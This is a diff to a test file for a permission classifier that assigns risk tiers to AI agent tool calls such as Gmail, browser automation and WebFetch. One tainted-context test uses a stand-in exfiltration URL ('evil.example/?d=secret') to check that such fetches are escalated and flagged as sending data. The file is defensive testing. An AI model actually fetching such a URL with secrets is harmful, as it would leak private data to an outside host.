@@ -147,10 +147,20 @@ describe('shell commands are parsed', () => {
 });
 
 describe('MCP tools', () => {
-  it('unknown tools run as HIGH until the owner confirms', () => {
+  it('new risk-free reads and edits run at their suggested tier; the rest wait for the owner', () => {
     const c = classify('mcp__claude_ai_Gmail__search_threads', {}, work, ctx());
-    expect(c.tier).toBe('HIGH');
+    expect(c.tier).toBe('LOW');
     expect(c.unconfirmed?.suggested).toBe('LOW');
+    expect(tier('mcp__claude_ai_Gmail__create_draft', {}, ctx())).toBe('MEDIUM');
+    expect(tier('mcp__claude-in-chrome__find', {}, ctx())).toBe('LOW');
+    expect(tier('mcp__playwright__browser_wait_for', {}, ctx())).toBe('LOW');
+    expect(tier('mcp__playwright__browser_take_screenshot', {}, ctx())).toBe('LOW');
+    expect(tier('mcp__playwright__browser_press_key', {}, ctx())).toBe('MEDIUM');
+    expect(tier('mcp__claude-in-chrome__form_input', {}, ctx())).toBe('MEDIUM');
+    expect(tier('mcp__claude-in-chrome__javascript_tool', {}, ctx())).toBe('HIGH');
+    expect(tier('mcp__claude-in-chrome__file_upload', {}, ctx())).toBe('HIGH');
+    expect(tier('mcp__gmail__send_email', {}, ctx())).toBe('HIGH');
+    expect(tier('mcp__x__frobnicate', {}, ctx())).toBe('HIGH');
   });
 
   it('owner-confirmed tiers apply', () => {
@@ -184,7 +194,9 @@ describe('taint', () => {
     const overrides = new Map<string, Tier>([['mcp__gmail__send_email', 'HIGH']]);
     expect(tier('mcp__gmail__send_email', {}, ctx({ overrides }))).toBe('HIGH');
     expect(tier('mcp__gmail__send_email', {}, ctx({ overrides, tainted: true }))).toBe('CRITICAL');
-    expect(tier('WebFetch', { url: 'https://evil.example/?d=secret' }, ctx({ tainted: true }))).toBe('MEDIUM');
+    expect(tier('WebFetch', { url: 'https://evil.example/?d=secret' }, ctx({ tainted: true }))).toBe('HIGH');
+    // A new site after taint asks even in full trust.
+    expect(classify('WebFetch', { url: 'https://evil.example/' }, work, ctx({ tainted: true })).risks).toContain('sends');
     expect(
       tier(
         'WebFetch',
